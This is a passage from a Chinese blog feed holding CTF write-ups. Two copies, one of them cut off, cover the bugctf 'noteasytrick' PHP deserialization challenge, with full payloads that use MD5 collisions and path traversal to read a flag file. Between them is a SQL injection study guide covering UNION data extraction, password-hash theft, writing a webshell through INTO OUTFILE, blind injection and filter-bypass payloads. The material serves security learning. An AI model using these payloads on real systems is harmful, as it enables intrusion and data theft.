invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要绕过wakeup的执行.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;./sandbox/lock.lock&quot;</span>))</span><br></pre></td></tr></table></figure><p>这里需要进行绕过而file_get_contents()读到文件则返回读到的数据,而没有读到则返回false,而这里包含一个取反函数所以就只能读不到,这里将设法将其删除. </p><p>这里首先访问.&#x2F;sandbox&#x2F;lock.lock文件发现存在</p><p>这里了解到可以利用 <a href="https://www.cnblogs.com/w0s1np/p/14641597.html">ZipArchive</a> 的open方法进行删除这里的原因是由于原先wakeup的调用本来就为Ctf类的open方法而这里就找到了<a href="https://www.cnblogs.com/w0s1np/p/14641597.html">ZipArchive</a> 的open方法经过实验这里open总共有两个参数第二个参数的是要传入一个预定义常量而8的预定义常量含义大概是将文件进行关闭,防止产生报错.而不使用参数经过实验好像也可删除文件.</p><p>之后得到脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jesen</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;./sandbox/lock.lock&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$me</span>;&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span>  <span class="title class_">Jesen</span>();</span><br><span class="line"><span class="variable">$zip</span>  = <span class="keyword">new</span>  ZipArchive;</span><br><span class="line"><span class="variable">$a</span>-&gt;me = <span class="variable">$zip</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;:3:&#x27;</span>,<span class="string">&#x27;&quot;:4:&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里仅仅得到了c的值而a与b可以通过php的弱类型来绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])</span><br></pre></td></tr></table></figure><p> 其实php为了可以上传一个数组，会把结尾带一对中括号的变量，例如 xxx[]的name（就是$_POST中的key） </p><p>&#x3D;&#x3D;&#x3D;会比较类型，这个时候可以用到PHP中md5()函数无法处理数组（会返回NULL）来实现绕过。</p><p>payload: &#x2F;?a[]&#x3D;1&amp;b[]&#x3D;2 (上面&#x3D;&#x3D;的例子也可以用数组绕过)综上payload为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a[]=1&amp;b[]=2&amp;c=O:5:&quot;Jesen&quot;:4:&#123;s:8:&quot;filename&quot;;s:19:&quot;./sandbox/lock.lock&quot;;s:7:&quot;content&quot;;i:8;s:2:&quot;me&quot;;O:10:&quot;ZipArchive&quot;:5:&#123;s:6:&quot;status&quot;;i:0;s:9:&quot;statusSys&quot;;i:0;s:8:&quot;numFiles&quot;;i:0;s:8:&quot;filename&quot;;s:0:&quot;&quot;;s:7:&quot;comment&quot;;s:0:&quot;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>上传完之后再次访问.&#x2F;sandbox&#x2F;lock.lock文件发现并不存在</p><p>这里便绕过第一步了</p><p>这里直接需要b的值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>],<span class="number">0</span>,<span class="number">30</span>));</span><br></pre></td></tr></table></figure><p>而又需要绕过md5强类型碰撞</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])</span><br></pre></td></tr></table></figure><p>这里选用fastcoll软件进行生成,直接将1.txt拖动到fastcoll上面产生两个文件使用Hash软件进行对比md5值</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">./../../../../../../../../flag</span><br></pre></td></tr></table></figure><p>这里由于b对前30个字符进行截取所以直接产生30个.而这里产生的两个文件需要进行url编码而这里经过验证一般软件的url编码使用之后并不正确</p><p>而使用php内置的urlencode()函数才能正常</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readmyfile</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$fh</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line">    <span class="keyword">return</span><span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo md5( (readmyfile(&quot;1.txt&quot;)));</span></span><br><span class="line"><span class="comment">//echo &#x27;============================&#x27;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;1.txt&quot;</span>));</span><br><span class="line"><span class="comment">//echo md5( (readmyfile(&quot;2.txt&quot;)));</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;============================&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;2.txt&quot;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这时c的值可以进行另外的赋值因为他必须对Ctf类的open()函数进行调用才能执行到</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>],<span class="number">0</span>,<span class="number">30</span>));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jesen</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span><span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span><span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span><span class="variable">$me</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Jesen</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>产生的c与前两个进行组合产生最终payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=.%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%E9%86v%A1b%E9g%7B%C8%8A%84q%C3%7D%E0%B8%83%9B%EA%1C%E1%86%19%17%5E%3A%11%B9%A2%AB%E5%9C%1B%B6%0D%3E%84%D6%F2%8F%E8%EF1%BFm%95%F7%BC%87%C2%D9k%5D4%F1%FE%D7%F7%7B%A5%A0%DF%5D%C5P%BB%0D%27%12%D1%0DlLR%B1%D7%B4%22%D3u%60H%276%BD+%8At%C9%BF%5BOLOAp%C6%C8%AA%82k%93%9E%E8%BC%EB%B8s2%87I%DC%18%2F_I%22%F0%F3%CF%5D%05%9D%B2%0B%7DU&amp;b=.%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%E9%86v%A1b%E9g%7B%C8%8A%84q%C3%7D%E0%B8%83%9Bj%1C%E1%86%19%17%5E%3A%11%B9%A2%AB%E5%9C%1B%B6%0D%3E%84%D6%F2%8F%E8%EF1%BF%ED%95%F7%BC%87%C2%D9k%5D4%F1%FE%D7%F7%FB%A5%A0%DF%5D%C5P%BB%0D%27%12%D1%0DlLR%B1%D7%B4%22%D3u%60H%A76%BD+%8At%C9%BF%5BOLOAp%C6%C8%AA%82k%93%9E%E8%BC%EB%B8s%B2%86I%DC%18%2F_I%22%F0%F3%CF%5D%05%1D%B2%0B%7DU&amp;c=O:5:&quot;Jesen&quot;:3:&#123;s:8:&quot;filename&quot;;N;s:7:&quot;content&quot;;N;s:2:&quot;me&quot;;N;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bugctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入系统学习</title>
      <link href="/ctf/sql%E6%B3%A8%E5%85%A5/sql/sql-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/"/>
      <url>/ctf/sql%E6%B3%A8%E5%85%A5/sql/sql-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入系统学习"><a href="#sql注入系统学习" class="headerlink" title="sql注入系统学习"></a>sql注入系统学习</h1><h2 id="寻找及确认sql注入"><a href="#寻找及确认sql注入" class="headerlink" title="寻找及确认sql注入"></a>寻找及确认sql注入</h2><h3 id="于参数后面加一个单引号’"><a href="#于参数后面加一个单引号’" class="headerlink" title="于参数后面加一个单引号’"></a>于参数后面加一个单引号’</h3><h3 id="and于or"><a href="#and于or" class="headerlink" title="and于or"></a>and于or</h3><h3 id="加法和减法"><a href="#加法和减法" class="headerlink" title="加法和减法"></a>加法和减法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数字型不需要单引号时</span><br></pre></td></tr></table></figure><h2 id="利用sql注入"><a href="#利用sql注入" class="headerlink" title="利用sql注入"></a>利用sql注入</h2><h3 id="识别数据库"><a href="#识别数据库" class="headerlink" title="识别数据库"></a>识别数据库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asp和.netMicrosoft SQL Server</span><br><span class="line">PHPMysql.PostgreSQL</span><br><span class="line">javaOracle.Mysql</span><br></pre></td></tr></table></figure><h4 id="基于错误识别数据库"><a href="#基于错误识别数据库" class="headerlink" title="基于错误识别数据库"></a>基于错误识别数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要一条详细的报错信息</span><br></pre></td></tr></table></figure><h4 id="基于数字函数推断"><a href="#基于数字函数推断" class="headerlink" title="基于数字函数推断"></a>基于数字函数推断</h4><table><thead><tr><th>数据库服务器</th><th>函数</th></tr></thead><tbody><tr><td>Mircrosoft SQL Server</td><td>@@pack_received.@@rowcount</td></tr><tr><td>Mysql</td><td>connection_id().last_insert_id().row_count().len()</td></tr><tr><td>Oracle</td><td>BITAND(1,1).length()</td></tr><tr><td>postgreSQL</td><td>select EXTRACT(DOW FROM NOW())</td></tr></tbody></table><p>connection_id()不管值多少都是正的也就是真的,last_insert_id()这里不存在insert语句,默认情况就是返回零,也就是假.</p><p>那么如果and connection_id()数据返回正常,and last_insert_id()不返回数据我们就可以推断这个是一个mysql数据库了</p><h3 id="UNION语句提取数据"><a href="#UNION语句提取数据" class="headerlink" title="UNION语句提取数据"></a>UNION语句提取数据</h3><p>UNION语句可以合并两条或多条SELECT语句的查询结果,如果应用返回了第一条查询语句的数据,我们就可以在第一条查询语句后面注入一个UNION运算符添加一个任意查询,来提取数据,但是必须满足两个条件</p><ul><li><p>两个查询返回的列数必须相同</p><p>  可以使用NULL来尝试,由于NULL值会转成任何数据类型</p>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select null,null,null...这样加上去知道不返回错误</span><br><span class="line">order by 4</span><br></pre></td></tr></table></figure></li><li><p>两个查询语句对于列返回的数据类型必须相同</p>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用我们的测试字符串进行替换null</span><br><span class="line">union select user(),@@version,null</span><br></pre></td></tr></table></figure></li></ul><h3 id="枚举数据库"><a href="#枚举数据库" class="headerlink" title="枚举数据库"></a>枚举数据库</h3><p>表,列,数据存放在information_schema数据库中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库名存放在information_schema数据库下的schemata表的schema_name字段中</span><br><span class="line">union select null,schema_name,null from information_shcema.schemata</span><br><span class="line"></span><br><span class="line">表名存放在information_schema数据库下tables表table_name字段中</span><br><span class="line">union select null,table_name,null from information_schema.tables where table_schema=&quot;wanan&quot;</span><br><span class="line"></span><br><span class="line">数据在表里</span><br><span class="line">union select username,password ,null from users</span><br></pre></td></tr></table></figure><h3 id="窃取哈希口令"><a href="#窃取哈希口令" class="headerlink" title="窃取哈希口令"></a>窃取哈希口令</h3><p>mysql在mysql.user表中存储哈希口令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user,password from mysql.user</span><br><span class="line">哈希口令是通过PASSWORD()函数计算的</span><br><span class="line">select password(&#x27;wanan&#x27;)</span><br></pre></td></tr></table></figure><h3 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h3><p>利用sql注入像服务器写文件(这里需要得到网站的绝对路径)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select into outfile(dumpfile)//mysql 写文件命令</span><br><span class="line">select &quot;&lt;?php echo &#x27;test&#x27;;?&gt;&quot; into outfile &quot;/var/www/test.php&quot;;</span><br></pre></td></tr></table></figure><h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.提交一个导致sql查询无效时,会返回一个通用错误页面,提交正确则会返回一个内容可被适度控制的页面</span><br><span class="line">2.提交一个导致sql查询无效时,会返回一个通用的错误页面,提交正确则会返回一个内容不可空页面</span><br><span class="line">3.提交受损或不正确的sql即不会产生错误页面,也不会以任何方式影响页面输出</span><br></pre></td></tr></table></figure><h3 id="基于布尔"><a href="#基于布尔" class="headerlink" title="基于布尔"></a>基于布尔</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SUBSTRING(str,pos,len)</span><br><span class="line">没有len参数的形式返回一个字符串从字符串str从位置pos开始。一个len参数的形式返回len个字符长的字符串str的子串，从位置pos开始，形式使用的是标准的SQL语法。另外，也可以使用负的值为pos。在这种情况下，刚开始的子串位置的字符结尾的字符串，而不是开始。负的值可用于为pos在此函数中的任何形式的。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and SUBSTRING(user(),1,1)=&#x27;a&#x27;看返回true还是false</span><br></pre></td></tr></table></figure><h3 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select if(SUBSTRING(user(),1,4)=&#x27;root&#x27;,sleep(4),1),null,null</span><br></pre></td></tr></table></figure><h2 id="绕开过滤"><a href="#绕开过滤" class="headerlink" title="绕开过滤"></a>绕开过滤</h2><h3 id="大小写变种"><a href="#大小写变种" class="headerlink" title="大小写变种"></a>大小写变种</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如使用strstr($id,&#x27;union&#x27;) strstr()函数是对大小写敏感的,所以可以大小写绕过</span><br></pre></td></tr></table></figure><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对数据进行url编码</span><br></pre></td></tr></table></figure><p>双url编码,但是前提是后面有一个url解码</p><h3 id="sql注释"><a href="#sql注释" class="headerlink" title="sql注释"></a>sql注释</h3><p>当仅使用strstr($id,’ ‘)过滤空格时,可以使用注释符等绕过</p><h3 id="空字符"><a href="#空字符" class="headerlink" title="空字符"></a>空字符</h3><p>通常的输入过滤器都是在应用程序之外的代码实现的。比如<a href="http://www.ichunqiu.com/course/298?bbs">入侵检测系统</a>（IDS），这些系统一般是由原生编程语言开发而成，比如C++，为什么空字节能起作用呢，就是因为在原生变成语言中，根据字符串起始位置到第一个出现空字节的位置来确定字符串长度。所以说空字节就有效的终止了字符串。</p><p> 只需要在过滤器阻止的字符串前面提供一个采用URL编码的空字节即可，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%00&#x27; union select username,password from users where username=&#x27;admin&#x27; --</span><br></pre></td></tr></table></figure><h3 id="二次SQL注入"><a href="#二次SQL注入" class="headerlink" title="二次SQL注入"></a>二次SQL注入</h3><p>查询的语句所用到的变量name就是从数据库提取到的我们的用户名，所以我们可以先利用更新我们的用户名功能插入语句进数据库。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bugctf的noteasytrick</title>
      <link href="/ctf/%E5%85%B6%E4%BB%96/comprehensive-bugctf%E7%9A%84noteasytrick/"/>
      <url>/ctf/%E5%85%B6%E4%BB%96/comprehensive-bugctf%E7%9A%84noteasytrick/</url>
      
        <content type="html"><![CDATA[<h1 id="bugctf-的noteasytrick"><a href="#bugctf-的noteasytrick" class="headerlink" title="bugctf 的noteasytrick"></a>bugctf 的noteasytrick</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;Off&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jesen</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$me</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;me = <span class="keyword">new</span> <span class="title class_">Ctf</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;me-&gt;<span class="title function_ invoke__">open</span>(<span class="variable language_">$this</span>-&gt;filename,<span class="variable language_">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctf</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;die&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;./sandbox/lock.lock&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>],<span class="number">0</span>,<span class="number">30</span>));</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./sandbox/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$filename</span>.<span class="title function_ invoke__">time</span>()),<span class="variable">$content</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;or you can guess the final filename?&quot;</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要绕过wakeup的执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;./sandbox/lock.lock&quot;</span>))</span><br></pre></td></tr></table></figure><p>这里需要进行绕过而file_get_contents()读到文件则返回读到的数据,而没有读到则返回false,而这里包含一个取反函数所以就只能读不到,这里将设法将其删除.</p><p>这里首先访问.&#x2F;sandbox&#x2F;lock.lock文件发现存在</p><p>这里了解到可以利用 <a href="https://www.cnblogs.com/w0s1np/p/14641597.html">ZipArchive</a> 的open方法进行删除这里的原因是由于原先wakeup的调用本来就为Ctf类的open方法而这里就找到了<a href="https://www.cnblogs.com/w0s1np/p/14641597.html">ZipArchive</a> 的open方法经过实验这里open总共有两个参数第二个参数的是要传入一个预定义常量而8的预定义常量含义大概是将文件进行关闭,防止产生报错.而不使用参数经过实验好像也可删除文件.</p><p>之后得到脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jesen</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;./sandbox/lock.lock&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$me</span>;&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span>  <span class="title class_">Jesen</span>();</span><br><span class="line"><span class="variable">$zip</span>  = <span class="keyword">new</span>  ZipArchive;</span><br><span class="line"><span class="variable">$a</span>-&gt;me = <span class="variable">$zip</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;:3:&#x27;</span>,<span class="string">&#x27;&quot;:4:&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里仅仅得到了c的值而a与b可以通过php的弱类型来绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])</span><br></pre></td></tr></table></figure><p> 其实php为了可以上传一个数组，会把结尾带一对中括号的变量，例如 xxx[]的name（就是$_POST中的key） </p><p>&#x3D;&#x3D;&#x3D;会比较类型，这个时候可以用到PHP中md5()函数无法处理数组（会返回NULL）来实现绕过。</p><p>payload: &#x2F;?a[]&#x3D;1&amp;b[]&#x3D;2 (上面&#x3D;&#x3D;的例子也可以用数组绕过)综上payload为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a[]=1&amp;b[]=2&amp;c=O:5:&quot;Jesen&quot;:4:&#123;s:8:&quot;filename&quot;;s:19:&quot;./sandbox/lock.lock&quot;;s:7:&quot;content&quot;;i:8;s:2:&quot;me&quot;;O:10:&quot;ZipArchive&quot;:5:&#123;s:6:&quot;status&quot;;i:0;s:9:&quot;statusSys&quot;;i:0;s:8:&quot;numFiles&quot;;i:0;s:8:&quot;filename&quot;;s:0:&quot;&quot;;s:7:&quot;comment&quot;;s:0:&quot;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>上传完之后再次访问.&#x2F;sandbox&#x2F;lock.lock文件发现并不存在</p><p>这里便绕过第一步了</p><p>这里直接需要b的值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>],<span class="number">0</span>,<span class="number">30</span>));</span><br></pre></td></tr></table></figure><p>而又需要绕过md5强类型碰撞</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])</span><br></pre></td></tr></table></figure><p>这里选用fastcoll软件进行生成,直接将1.txt拖动到fastcoll上面产生两个文件使用Hash软件进行对比md5值</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">./../../../../../../../../flag</span><br></pre></td></tr></table></figure><p>这里由于b对前30个字符进行截取所以直接产生30个.而这里产生的两个文件需要进行url编码而这里经过验证一般软件的url编码使用之后并不正确</p><p>而使用php内置的urlencode()函数才能正常</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readmyfile</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$fh</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line">    <span class="keyword">return</span><span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo md5( (readmyfile(&quot;1.txt&quot;)));</span></span><br><span class="line"><span class="comment">//echo &#x27;============================&#x27;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;1.txt&quot;</span>));</span><br><span class="line"><span class="comment">//echo md5( (readmyfile(&quot;2.txt&quot;)));</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;============================&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;2.txt&quot;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这时c的值可以进行另外的赋值因为他必须对Ctf类的open()函数进行调用才能执行到</p><figure class="highlight php"><table><tr><td 